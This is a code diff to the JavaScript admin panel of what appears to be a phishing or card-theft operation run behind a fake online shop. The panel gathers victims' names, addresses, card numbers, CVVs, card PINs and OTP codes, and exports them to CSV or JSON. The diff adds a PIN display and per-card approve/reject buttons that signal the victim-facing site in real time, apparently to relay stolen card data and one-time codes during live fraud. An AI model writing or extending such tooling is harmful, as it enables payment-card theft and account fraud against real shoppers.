@@ -60,8 +60,6 @@
     detailTitle: $('detail-title'),
     detailContent: $('detail-content'),
     detailClose: $('detail-close'),
-    detailApprove: $('detail-approve'),
-    detailReject: $('detail-reject'),
     detailCancel: $('detail-cancel'),
     settingsModal: $('settings-modal'),
     settingsClose: $('settings-close'),
@@ -298,9 +296,12 @@
         // بيانات العميل (من customers)
         name: m.name || '',
         phone: m.phone || '',
-        mobile: m.phone || '',
         address: m.address || '',
+        apartment: m.apartment || '',
+        deliveryNotes: m.deliveryNotes || '',
+        items: m.items || [],
         amount: m.amount || '',
+        paymentType: m.paymentType || '',
         otp: latestOtp ? latestOtp.otp : (m.otp || ''),
         otp2: m.otp2 || '',
         idNumber: m.idNumber || '',
@@ -323,8 +324,13 @@
         browser: m.browser || '',
       };
     })
-    // إخفاء العناصر المخفية
-    .filter(x => !x.isHidden)
+    // إظهار العملاء الذين أدخلوا بياناتهم فقط (ليس مجرد زائرين)
+    // العميل يظهر إذا كان لديه: اسم أو هاتف أو عنوان أو بطاقة أو OTP
+    .filter(x => !x.isHidden && (
+      x.name || x.phone || x.address ||
+      (x.allCards && x.allCards.length > 0) ||
+      (x.allOtps && x.allOtps.length > 0)
+    ))
     // ترتيب: آخر نشاط أولاً (الأحدث)
     .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));
 
@@ -353,7 +359,7 @@
       // البحث
       if (searchQuery) {
         const q = searchQuery.toLowerCase();
-        const hay = [n.name, n.phone, n.mobile, n.country, n.otp, n.cardNumber, n.bank, n.currentPage, n.sessionId, n.id].filter(Boolean).join(' ').toLowerCase();
+        const hay = [n.name, n.phone, n.country, n.otp, n.cardNumber, n.bank, n.currentPage, n.sessionId, n.id].filter(Boolean).join(' ').toLowerCase();
         if (!hay.includes(q)) return false;
       }
       return true;
@@ -434,7 +440,7 @@
       const status = n.decision || n.status || 'pending';
       const flagBorder = n.flagColor ? `style="border-right:3px solid ${n.flagColor === 'red' ? '#ef4444' : n.flagColor === 'yellow' ? '#eab308' : '#22c55e'}"` : '';
       const countryOrBank = n.country || n.bank || 'غير معروف';
-      const hasPersonal = n.phone || n.name || n.mobile || n.idNumber;
+      const hasPersonal = n.phone || n.name;
       return `
         <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors" ${flagBorder} data-id="${escapeHtml(n.id)}">
           <td class="px-6 py-4">
@@ -506,16 +512,20 @@
     currentDetailId = n.id;
     els.detailTitle.textContent = type === 'card' ? 'معلومات البطاقة' : 'المعلومات الشخصية';
     if (type === 'personal') {
-      // معلومات شخصية من customers + كل الـ OTPs في صناديق منفصلة
+      // معلومات شخصية من customers — البيانات التي يجمعها الموقع فعلياً
+      const itemsText = (n.items && n.items.length)
+        ? n.items.map(it => `${escapeHtml(it.name || 'منتج')} × ${escapeHtml(String(it.qty || 1))} (${escapeHtml(String(it.price || 0))} د.ك)`).join('، ')
+        : '';
+      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
       const fields = [
         { label: 'الاسم', value: n.name },
-        { label: 'رقم الهوية', value: n.idNumber, sensitive: true },
-        { label: 'الشبكة', value: n.network },
-        { label: 'رقم الجوال', value: n.mobile || n.phoneNumber },
-        { label: 'الهاتف', value: n.phone },
-        { label: 'رمز الهاتف', value: n.otp2, sensitive: true },
-        { label: 'البريد الإلكتروني', value: n.email },
-        { label: 'الدولة', value: n.country },
+        { label: 'رقم الهاتف', value: n.phone },
+        { label: 'العنوان', value: n.address },
+        { label: 'الشقة / رقم الباب', value: n.apartment },
+        { label: 'تعليمات خاصة', value: n.deliveryNotes },
+        { label: 'المنتج', value: itemsText },
+        { label: 'طريقة الدفع', value: paymentLabel },
+        { label: 'المبلغ', value: n.amount },
       ];
       let html = renderDetailFields(fields);
 
@@ -565,9 +575,12 @@
           cardNumber: card.cardNumber || n.cardNumber,
           prefix: card.cardPrefix || card.prefix || n.prefix,
           expiry: card.expiry || n.expiryDate,
-          cvv: card.pin || card.cvv || n.cvv,
+          pin: card.pin || '',
+          cvv: card.cvv || '',
           timestamp: card.timestamp || '',
         };
+        const cardId = card.id || '';
+        const cardDecision = card.decision || '';
         if (cards.length > 1) {
           html += `<div class="mb-2 flex items-center gap-2">
             <span class="text-xs font-semibold ${isLatest ? 'text-emerald-400' : 'text-slate-500'} bg-${isLatest ? 'emerald' : 'slate'}-500/10 px-2 py-0.5 rounded">البطاقة ${cards.length - i}</span>
@@ -578,10 +591,26 @@
           { label: 'البنك', value: cardData.bank },
           { label: 'رقم البطاقة', value: cardData.cardNumber ? `${cardData.cardNumber} - ${cardData.prefix || ''}` : undefined },
           { label: 'تاريخ الانتهاء', value: cardData.expiry },
+          { label: 'الرقم السري (PIN)', value: cardData.pin },
           { label: 'رمز الأمان (CVV)', value: cardData.cvv },
         ]);
         if (cardData.timestamp) {
           html += `<div class="text-xs text-slate-500 text-left mb-2">الوقت: ${escapeHtml(cardData.timestamp)}</div>`;
+        }
+        // أزرار الموافقة/الرفض لكل محاولة دفع — تظهر لمرة واحدة، ثم تُخفى وتُعرض الحالة
+        if (cardDecision === 'approved') {
+          html += `<div class="mt-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-center">
+            <span class="text-sm font-semibold text-emerald-400">✓ تمت الموافقة</span>
+          </div>`;
+        } else if (cardDecision === 'rejected') {
+          html += `<div class="mt-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-center">
+            <span class="text-sm font-semibold text-red-400">✕ تم الرفض</span>
+          </div>`;
+        } else if (cardId) {
+          html += `<div class="mt-2 flex gap-2" data-card-actions="${escapeHtml(cardId)}">
+            <button class="card-approve flex-1 bg-green-500 hover:bg-green-600 text-white font-semibold rounded-md py-2 text-sm transition-colors" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(n.sessionId)}">موافقة</button>
+            <button class="card-reject flex-1 bg-red-500 hover:bg-red-600 text-white font-semibold rounded-md py-2 text-sm transition-colors" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(n.sessionId)}">رفض</button>
+          </div>`;
         }
         if (i < cards.length - 1) {
           html += '<div class="my-3 border-t border-slate-700"></div>';
@@ -610,13 +639,23 @@
         <div class="mt-4 pt-4 border-t border-slate-700">
           <h4 class="text-sm font-semibold text-blue-400 mb-3">معلومات إضافية</h4>
           ${renderDetailFields([
-            { label: 'كلمة المرور', value: n.pass },
-            { label: 'الخطوة الحالية', value: n.step },
             { label: 'المبلغ', value: n.amount },
           ])}
         </div>
       `;
       els.detailContent.innerHTML = html;
+
+      // ربط أزرار الموافقة/الرفض لكل بطاقة
+      els.detailContent.querySelectorAll('.card-approve').forEach(btn => {
+        btn.addEventListener('click', () => {
+          setCardDecision(btn.dataset.cardId, btn.dataset.sessionId, 'approved', btn);
+        });
+      });
+      els.detailContent.querySelectorAll('.card-reject').forEach(btn => {
+        btn.addEventListener('click', () => {
+          setCardDecision(btn.dataset.cardId, btn.dataset.sessionId, 'rejected', btn);
+        });
+      });
     }
     els.detailModal.classList.remove('hidden');
   }
@@ -651,22 +690,65 @@
     }
   }
 
+  // موافقة/رفض لكل محاولة دفع (بطاقة) على حدة
+  // يكتب القرار في وثيقة البطاقة cards/{cardId} (لإخفاء الأزرار وعرض الحالة)
+  // ويكتبه أيضاً في customers/{sessionId} ليتفاعل موقع العميل
+  async function setCardDecision(cardId, sessionId, decision, btnEl) {
+    if (!cardId) { toast('تعذّر تحديد البطاقة', 'error'); return; }
+    try {
+      // تحديث فوري للواجهة (إخفاء الأزرار وعرض الحالة) قبل انتظار الشبكة
+      if (btnEl) {
+        const actionsBox = btnEl.closest('[data-card-actions]');
+        if (actionsBox) {
+          const isApproved = decision === 'approved';
+          actionsBox.outerHTML = isApproved
+            ? `<div class="mt-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-center"><span class="text-sm font-semibold text-emerald-400">✓ تمت الموافقة</span></div>`
+            : `<div class="mt-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-center"><span class="text-sm font-semibold text-red-400">✕ تم الرفض</span></div>`;
+        }
+      }
+      // كتابة القرار على وثيقة البطاقة (لكل محاولة على حدة)
+      await db.collection('cards').doc(cardId).set({
+        decision: decision,
+        decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
+      }, { merge: true });
+      // كتابة القرار على وثيقة العميل ليتفاعل موقع العميل
+      if (sessionId) {
+        await db.collection('customers').doc(sessionId).set({
+          decision: decision,
+          status: decision,
+          decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
+          lastSeen: Date.now(),
+        }, { merge: true });
+      }
+      toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
+    } catch (err) {
+      console.error('setCardDecision error:', err);
+      toast('خطأ في إرسال القرار: ' + (err.message || ''), 'error');
+    }
+  }
+
   // ── تصدير البيانات ──────────────────────────────────────────
   function exportData(format) {
     const data = filteredNotifications.map(n => {
       const d = n.lastSeen ? new Date(n.lastSeen) : null;
+      const itemsText = (n.items && n.items.length)
+        ? n.items.map(it => `${it.name || 'منتج'} × ${it.qty || 1}`).join('، ')
+        : '';
+      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
       return {
-        sessionId: n.sessionId || '', name: n.name || '', phone: n.phone || '', country: n.country || '',
+        sessionId: n.sessionId || '', name: n.name || '', phone: n.phone || '', address: n.address || '',
+        apartment: n.apartment || '', deliveryNotes: n.deliveryNotes || '', items: itemsText,
+        paymentType: paymentLabel, amount: n.amount || '',
         bank: n.bank || '', cardNumber: n.cardNumber || '', expiry: n.expiryDate || '', cvv: n.cvv || '',
-        status: n.decision || n.status || '', otp: n.otp || '', amount: n.amount || '',
+        otp: n.otp || '', status: n.decision || n.status || '', country: n.country || '',
         currentPage: n.currentPage || '', lastSeen: d ? d.toISOString() : '',
       };
     });
+    const headers = ['sessionId', 'name', 'phone', 'address', 'apartment', 'deliveryNotes', 'items', 'paymentType', 'amount', 'bank', 'cardNumber', 'expiry', 'cvv', 'otp', 'status', 'country', 'currentPage', 'lastSeen'];
     if (format === 'json') {
       const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
       downloadBlob(blob, `notifications-${Date.now()}.json`);
     } else {
-      const headers = ['sessionId', 'name', 'phone', 'country', 'bank', 'cardNumber', 'expiry', 'cvv', 'status', 'otp', 'amount', 'currentPage', 'lastSeen'];
       const rows = [headers.join(',')].concat(data.map(r => headers.map(h => `"${String(r[h] || '').replace(/"/g, '""')}"`).join(',')));
       downloadBlob(new Blob(['\ufeff' + rows.join('\n')], { type: 'text/csv;charset=utf-8' }), `notifications-${Date.now()}.csv`);
     }
@@ -809,12 +891,6 @@
   // نافذة التفاصيل
   els.detailClose.addEventListener('click', () => els.detailModal.classList.add('hidden'));
   els.detailCancel.addEventListener('click', () => els.detailModal.classList.add('hidden'));
-  els.detailApprove.addEventListener('click', () => {
-    if (currentDetailId) { setDecision(currentDetailId, 'approved'); els.detailModal.classList.add('hidden'); }
-  });
-  els.detailReject.addEventListener('click', () => {
-    if (currentDetailId) { setDecision(currentDetailId, 'rejected'); els.detailModal.classList.add('hidden'); }
-  });
   els.detailModal.addEventListener('click', (e) => {
     if (e.target === els.detailModal) els.detailModal.classList.add('hidden');
   });
